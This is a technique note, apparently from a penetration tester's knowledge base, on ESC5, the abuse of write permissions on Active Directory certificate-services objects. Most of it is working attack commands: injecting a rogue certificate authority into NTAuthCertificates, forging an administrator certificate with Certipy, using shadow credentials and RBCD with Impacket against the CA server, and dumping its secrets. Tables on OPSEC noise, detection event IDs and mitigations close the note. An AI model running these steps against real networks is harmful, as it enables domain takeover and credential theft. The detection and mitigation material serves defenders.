---
title: "ESC5 — Vulnerable PKI Object Access Control"
description: "ESC5 is a broad category of permission-level attacks against the various Active Directory objects that comprise the PKI infrastructure. Unlike ESC4 which…"
category: active-directory
tags: ["active-directory", "adcs", "pivoting"]
tools: ["Impacket", "Certipy", "BloodHound", "OpenSSL", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC5 — Vulnerable PKI Object Access Control.md"
---
# ESC5 — Vulnerable PKI Object Access Control

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | AD Object Permission Abuse |
| **Difficulty** | Medium–High |
| **Pre-requisites** | Write/ownership ACE on PKI AD objects |
| **Tools** | Certipy, BloodHound, PowerView, Impacket |
| **OPSEC Noise** | Medium — AD object modifications generate directory change events |
| **One-liner** | Abuse write permissions on PKI infrastructure AD objects to enable other ESC attack paths or inject a rogue CA. |

***

## What Is ESC5?

ESC5 is a **broad category of permission-level attacks** against the various Active Directory objects that comprise the PKI infrastructure. Unlike ESC4 which targets a single certificate template object, ESC5 targets the **containers and objects that hold the entire ADCS ecosystem together**. These objects live in the `Configuration` naming context — meaning they replicate **forest-wide**. Compromising them can affect every domain in a multi-domain forest.

The key insight: ADCS doesn't exist in a vacuum — its security depends on the ACLs of multiple AD objects. If any one of them has overly permissive DACLs, an attacker can pivot into template abuse (ESC1–4), CA control (ESC6–7), or direct domain compromise.

***

## The Vulnerable PKI Objects

All these objects live under `CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com`:

| Object | Path | What Control Over It Gets You |
|--------|------|-------------------------------|
| **CA Server AD Computer Object** | `CN=Computers` (or its OU) | RBCD / Shadow Credentials → local admin on CA → Golden Certificate |
| **CA Server's DCOM/RPC Interface** | Network access to CA | Direct cert request/approval capability |
| **NTAuthCertificates** | `CN=NTAuth,CN=Public Key Services,...` | Inject a rogue CA → forge any certificate trusted for domain auth |
| **Certificate Templates Container** | `CN=Certificate Templates,...` | Create/modify templates → introduce ESC1–4 vulns |
| **Enrollment Services Container** | `CN=Enrollment Services,...` | Control which templates are published, modify CA behaviour |
| **OID Container** | `CN=OID,...` | Manipulate issuance policy OIDs (relevant to ESC13) |

***

## Attack Path 1 — Rogue CA via NTAuthCertificates

This is the **most devastating ESC5 path**. If you can write to the `NTAuthCertificates` object, you can inject your own CA certificate and forge trusted authentication certs offline — similar in impact to a Golden Certificate but without needing CA server access.

### Step 1 — Check ACLs on NTAuthCertificates

```bash
# Using Certipy
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -stdout

# Using PowerView
Get-DomainObjectAcl -SearchBase \
  "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb" \
  -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match 'Write' -or $_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner'
  }
```

### Step 2 — Generate a Rogue CA Certificate

```bash
# Generate a self-signed CA cert
openssl req -x509 -newkey rsa:4096 -keyout rogue-ca.key -out rogue-ca.crt \
  -days 3650 -nodes -subj "/CN=Rogue-CA"

# Convert to PFX
openssl pkcs12 -export -out rogue-ca.pfx -inkey rogue-ca.key -in rogue-ca.crt -passout pass:
```

### Step 3 — Inject Rogue CA into NTAuthCertificates

```powershell
# PowerShell — add the rogue CA to NTAuthCertificates
certutil -dspublish -f rogue-ca.crt NTAuthCA

# Or via LDAP modification
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new("rogue-ca.crt")
$NTAuth = "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb"
Set-ADObject $NTAuth -Add @{cACertificate=$cert.RawData}
```

### Step 4 — Forge Certificates Signed by the Rogue CA

```bash
# Use certipy forge with your rogue CA key
certipy-ad forge \
  -ca-pfx rogue-ca.pfx \
  -upn 'administrator@domain.htb' \
  -subject 'CN=Administrator,CN=Users,DC=domain,DC=htb'

# Authenticate
certipy-ad auth \
  -pfx administrator_forged.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET
```

***

## Attack Path 2 — RBCD/Shadow Credentials on CA Computer Object

If you have `GenericWrite` or `GenericAll` over the CA server's **computer object in AD**, you can perform Resource-Based Constrained Delegation (RBCD) or Shadow Credentials to gain local admin on the CA server, then extract the CA private key (Golden Certificate path).

```bash
# Shadow Credentials on CA computer object
certipy-ad shadow auto \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -target 'CA-SERVER$'

# Or RBCD
impacket-rbcd \
  'domain.htb/lowpriv:Password123!' \
  -delegate-to 'CA-SERVER$' \
  -delegate-from 'EVILPC$' \
  -dc-ip $TARGET \
  -action write

# Then S4U2Self/S4U2Proxy to get service ticket
impacket-getST \
  'domain.htb/EVILPC$:EvilPass!' \
  -spn 'cifs/CA-SERVER.domain.htb' \
  -impersonate administrator \
  -dc-ip $TARGET

# Use the ticket to access CA server
export KRB5CCNAME=administrator@cifs_CA-SERVER.domain.htb@DOMAIN.HTB.ccache
secretsdump.py -k -no-pass CA-SERVER.domain.htb

# Then → certipy backup → Golden Certificate
```

***

## Attack Path 3 — Certificate Templates Container Write

If you have write access to the `CN=Certificate Templates` container itself (not just a single template), you can **create entirely new templates** with ESC1-vulnerable settings.

```powershell
# Check ACL on the container
Get-DomainObjectAcl -SearchBase \
  "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb" \
  -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match 'CreateChild|GenericAll|WriteDACL'
  }
```

***

## Enumeration

```bash
# Certipy will surface some ESC5 paths
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# BloodHound is superior for ESC5 — it maps ACE edges to PKI objects
# Look for edges: GenericAll, GenericWrite, WriteDACL, WriteOwner, Owns
# FROM: low-priv principals
# TO: CA computer objects, NTAuthCertificates, Certificate Templates container
```

### BloodHound Cypher Queries

```cypher
// Find principals with dangerous rights over PKI objects
MATCH (n)-[r:GenericAll|GenericWrite|WriteDACL|WriteOwner|Owns]->(m)
WHERE m.name =~ '.*CERTIFICATE.*|.*NTAUTH.*|.*ENROLLMENT.*|.*CA.*'
RETURN n.name, type(r), m.name

// Find principals with write access to NTAuthCertificates
MATCH (n)-[r]->(m {name: 'NTAUTHCERTIFICATES@DOMAIN.HTB'})
WHERE type(r) IN ['GenericAll', 'GenericWrite', 'WriteDACL', 'WriteOwner']
RETURN n.name, type(r)
```

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Querying PKI object ACLs | LDAP query — low noise | 🟢 Low |
| Modifying NTAuthCertificates | Directory Service Changes (5136) | 🔴 High |
| RBCD write on CA computer | Directory Service Changes (5136) | 🔴 High |
| Creating new certificate template | Directory Service Changes (5136/5137) | 🔴 High |

***

## ESC5 vs ESC4

| | ESC4 | ESC5 |
|---|---|---|
| **Target** | Single certificate template object | Multiple PKI infrastructure objects |
| **Scope** | Template-level | Forest-wide (Configuration NC) |
| **End goal** | Mutate template → ESC1 | Enable ESC1–4, inject rogue CA, or Golden Cert path |
| **BloodHound visibility** | Template ACE edges | PKI container/object ACE edges |

***

## Detection Indicators

- **Event ID 5136/5137** — Directory Service object modifications in the `CN=Public Key Services` container
- **Event ID 4742** — Computer account changed (if RBCD path used against CA computer)
- **NTAuthCertificates monitoring** — Alert on ANY modification to the `cACertificate` attribute
- **BloodHound** — Dangerous ACE edges from non-admin principals to PKI objects

***

## Mitigation

- **Audit PKI object DACLs** — Only `Enterprise Admins` and `Domain Admins` should have write access to objects under `CN=Public Key Services`
- **Protect the CA computer object** — Treat it as Tier 0; remove `GenericWrite`/`GenericAll` from any non-admin principal
- **Monitor NTAuthCertificates** — Any change should trigger an immediate security alert
- **Lock down the Certificate Templates container** — Only PKI admins should be able to create or modify templates
- **Enable AD DS auditing** on the Configuration partition to catch modifications
